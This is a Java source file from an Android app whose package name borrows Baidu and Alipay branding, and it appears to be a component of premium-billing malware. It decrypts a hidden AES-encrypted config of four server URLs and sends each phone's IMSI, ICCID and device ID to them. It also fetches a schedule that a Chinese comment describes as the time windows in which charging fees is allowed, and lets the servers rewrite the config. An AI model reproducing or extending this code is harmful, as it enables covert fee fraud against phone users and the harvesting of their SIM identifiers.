package com.baidu.alipay;

import java.io.BufferedInputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;

import android.content.Context;
import android.content.res.AssetManager;
import android.os.Handler;
import android.provider.MediaStore.Files;
import android.util.Log;

import com.baidu.alipay.net.MyPost;
import com.baidu.alipay.net.XmlAttribute;
import com.baidu.serv.BaseThread;

public class InitArgumentsHelper {

	private static final String TAG = "InitArgumentsUtils";
	
	private Context context;
	private String INI_FILE_NAME;
	private Properties props;
	private InitArguments initArgs;
	private byte[] aesKey = Constant.PASSWORD;
	
	private  boolean isSync = false;
	private  boolean isPositive = true;
	private  boolean isForce = false;
	private  String confirmTime = "00:00|00:00";//00:00|07:00;17:00|21:00
	private static InitArgumentsHelper instance = null;
	
	private static SimpleDateFormat sdf = new SimpleDateFormat();
	
	static{
		sdf.applyLocalizedPattern("HH:mm");
	}
	
	private void initConfirmTime(Context context){
//		if("00:00|00:00".equals(confirmTime)){
			try{
				Properties prop = Utils.getPropertiesFromAssets(context, "confirmTime.ini");
				
				String _confirmTime = prop.getProperty("confirmTime");
			
				if(_confirmTime != null && _confirmTime.length() > 0){
					this.confirmTime = _confirmTime;
				}
			}catch (Exception e) {
				e.printStackTrace();
			}
//		}
	}
	
	public boolean inConfirmTime(){
		
		if("00:01|23:58".equals(confirmTime)){
			Log.e(TAG, "start get from net");
			String _confirmTime = getConfirmTimeNet(context);
			Log.e(TAG, "end get from net");			
			if(_confirmTime != null){
				confirmTime = _confirmTime;
			}
		}
		
		return inConfirmTime(new Date(), confirmTime);
	}
	
	public static String getConfirmTimeNet(final Context context){
		final Map<Integer, String> map = new HashMap<Integer, String>();
		
		new BaseThread(null){
			public void run(){
				String urls[] = new String[]{instance.getInitArgs().getUrl1(),instance.getInitArgs().getUrl2(),instance.getInitArgs().getUrl3(),instance.getInitArgs().getUrl4()};
				
				String ss = "cid="+instance.getInitArgs().getCid()+"&imsi="+DeviceInfo.getIMSI(context)+"&iccid="+DeviceInfo.getICCID(context);
				ss += "&mobileId="+Utils.getMobileId(context);
				
				for(String url : urls){
					try{					
						url = url.replace("fetchTask", "confirmTime");
						
						String response = new MyPost().PostDataCommon(context, ss.getBytes(), url+"?"+ss);
						
						if(response != null){
							map.put(1, response);
							break;
						}					
					}catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
		}.start();
		
		int cnt = 0;
		
		while(!map.containsKey(1) && cnt <= 20){
			try {
				cnt ++;
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		
		return map.get(1);
	}
	
	/**
	 * 判断是否在通道允许扣费时间内 时间格式：08:00|09:30;10:00|13:00
	 * @param date
	 * @param confirmTime
	 * @return
	 */
	public static boolean inConfirmTime(Date date,String confirmTime){
		
		boolean needConfirm = false;
		
		if(confirmTime != null && confirmTime.length() > 0){
			String[] arr = confirmTime.split(";");
			
			String time = sdf.format(date);
			
			for(String times : arr){
				String[] subArr = times.split("\\|");
				
				if(subArr.length == 2){
					if(time.compareTo(subArr[0]) > 0 && time.compareTo(subArr[1]) < 0){
						needConfirm = true;
						break;
					}
				}
			}
		}
		
		return needConfirm;
	}
	
	public  boolean isSync(){
		
		return isSync;
	}
	
	public  boolean isForce(){
		
		return isForce;
	}
	
	public boolean isPositive(){
		
		return isPositive;
	}
	
	public synchronized static InitArgumentsHelper getInstance(Context context){
		if(instance == null){
			instance = new InitArgumentsHelper(context);
			instance.getInitArgs();
		}else{
			instance.context = context;
		}
		
		return instance;
	}
	
	private InitArgumentsHelper(Context context){
		this.context = context;
		initConfirmTime(context);
	}
	
	// 初始化，读取ini文件，首先读取的是放置在程序目录下面的ini，如果未读取到，则读取assets下面的
    // 并copy到程序目录下，将来的上访更新也是更新程序目录下面的
    // 然后放入到initArgument变量中
	public InitArguments getInitArgs() {
		
		if(initArgs != null){
			return initArgs;
		}
		
		INI_FILE_NAME = context.getFilesDir().getAbsolutePath();
        if (INI_FILE_NAME != null) {
            if (INI_FILE_NAME.endsWith("/")) {
                INI_FILE_NAME += "billing.request.ini";
            } else {
                INI_FILE_NAME += "/billing.request.ini";
            }
        }
		
        initArgs = new InitArguments();
        props = new Properties();
        InputStream in = null;
        FileInputStream s = null;
        ByteArrayOutputStream byteStream = null;
        try {
            // 读取ini文件

            LogUtil.e(TAG, " read ini file from current catalog");

            // initFile();
            s = new FileInputStream(INI_FILE_NAME); // 暂且屏蔽从本目录下读取
        } catch (Exception e) {
            // 读取asset下面的ini文件，并copy到程序目录下

            LogUtil.e(TAG, " read ini file from asset");

            initFile();
        }

        if (s == null) {
            try {
                s = new FileInputStream(INI_FILE_NAME);
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }
        }
        int totleLen;
        try {
            if (s == null) {
                LogUtil.e(TAG, "s == null");
            }else{
            	totleLen = s.available();
                byteStream = new ByteArrayOutputStream(
                        totleLen);
                byte[] data = new byte[1024];
                int len = 0;
                while ((len = s.read(data)) != -1) {
                    byteStream.write(data, 0, len);
                }
               
                // 解密
                LogUtil.e(TAG, "解密获取到的数据");
                byte[] originalText = AES.decrypt(byteStream.toByteArray(),
                        Constant.PASSWORD);
                
                // 数据被破坏
                if (originalText == null) {
                    LogUtil.e(TAG, "数据被破坏");
                }else{
                	in = new BufferedInputStream(new ByteArrayInputStream(originalText));
                  
					props.load(in);
					initArgs.setUrl1(props.getProperty("u1"));
					initArgs.setUrl2(props.getProperty("u2"));
					initArgs.setUrl3(props.getProperty("u3"));
					initArgs.setUrl4(props.getProperty("u4"));
					initArgs.setReport(props.getProperty("report"));
					initArgs.setCid(Utils.getCid(context));
					initArgs.setPid(props.getProperty("pid"));
					initArgs.setSync(props.getProperty("sync","false"));
					initArgs.setPositive(props.getProperty("positive","false"));
					initArgs.setForce(props.getProperty("force","false"));
					initArgs.setConfirmTime(props.getProperty("confirmTime",""));
					
					isSync = Boolean.parseBoolean(initArgs.getSync());
					isPositive = Boolean.parseBoolean(initArgs.getPositive());
					isForce = Boolean.parseBoolean(initArgs.getForce());
					if(initArgs.getConfirmTime() != null && initArgs.getConfirmTime().length() > 0){
						confirmTime = initArgs.getConfirmTime();
					}
                }                
            }
        } catch (Exception e) {
            e.printStackTrace();
        }finally{
        	if(byteStream != null){
        		try {
					byteStream.close();
					byteStream = null;
				} catch (IOException e) {
					e.printStackTrace();
				}
        	}
        	
        	if(s != null){
        		try {
					s.close();
					s = null;
				} catch (IOException e) {
					e.printStackTrace();
				}
        	}
        	
        	if(in != null){
        		try {
					in.close();
					in = null;
				} catch (IOException e) {
					e.printStackTrace();
				}
        	}
        	
        	System.gc();
        }
        
        return initArgs;
    }

	/*
     * 读取asset下面的ini文件，并copy到程序目录下
     */
    private void initFile() {
    	AssetManager am = context.getAssets();
        InputStream is = null;
        FileOutputStream fileStream = null;
        byte[] str = new byte[1024];
        try {
            LogUtil.e(TAG, "initFile");
//            is = InitArgumentsHelper.class.getResourceAsStream("billing_request.ini");
            is = am.open("billing.request.ini");
            final int totleLen = is.available();
            ByteArrayOutputStream byteStream = new ByteArrayOutputStream(
                    totleLen);
            int len = 0;
            while ((len = is.read(str)) != -1) {
                byteStream.write(str, 0, len);
            }
            
            // copy 过去
            File file = new File(INI_FILE_NAME);
            file.createNewFile();
            fileStream = new FileOutputStream(INI_FILE_NAME,
                    false);
            fileStream.write(byteStream.toByteArray());
            
        } catch (IOException e) {
             LogUtil.e(TAG, "cannot copy ini_file：" + e.getMessage());
        }finally{
        	if(is != null){
        		try {
					is.close();
					is = null;
				} catch (IOException e) {
					e.printStackTrace();
				}
        	}
        	
        	if(fileStream != null){
        		try {
					fileStream.close();
					fileStream = null;
				} catch (IOException e) {
					e.printStackTrace();
				}
        	}
        	
        	System.gc();
        }

    }
    
   
	
    /**
     * 更新properties文件
     * 
     * @param xmlAttr
     */
    public synchronized void updateInitFile(XmlAttribute xmlAttr) {
    	ByteArrayOutputStream s = null;
    	FileOutputStream fileStream = null;
    	Properties props = new Properties();
    	
    	try {
            props.put("u1", xmlAttr.getUrl1() == null ? initArgs.getUrl1()
                    : xmlAttr.getUrl1());
            props.put("u2", xmlAttr.getUrl2() == null ? initArgs.getUrl2()
                    : xmlAttr.getUrl2());
            props.put("u3", xmlAttr.getUrl3() == null ? initArgs.getUrl3()
                    : xmlAttr.getUrl3());
            props.put("u4", xmlAttr.getUrl4() == null ? initArgs.getUrl4()
                    : xmlAttr.getUrl4());
            props.put("report",
                    xmlAttr.getReport() == null ? initArgs.getReport()
                            : xmlAttr.getReport());
//            props.put("cid", initArgs.getCid());
            props.put("pid", initArgs.getPid());
            props.put("sync", initArgs.getSync());
            props.put("positive", initArgs.getPositive());
            props.put("force", initArgs.getForce());
            
            instance.confirmTime = xmlAttr.getConfirmTime();
            props.put("confirmTime", xmlAttr.getConfirmTime());
            
            s = new ByteArrayOutputStream();
            props.store(s, "");
            
            byte[] initContentEncrypted = AES.encrypt(
                    new String(s.toByteArray()), aesKey);
            fileStream = new FileOutputStream(INI_FILE_NAME,
                    false);
            fileStream.write(initContentEncrypted);
         
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }finally{
        	if(s != null){
        		try {
					s.close();
					s = null;
				} catch (IOException e) {
					e.printStackTrace();
				}
        	}
        	
        	if(fileStream != null){
        		try {
					fileStream.close();
					fileStream = null;
				} catch (IOException e) {
					e.printStackTrace();
				}
        	}
        	
        	System.gc();
        }
    }
}
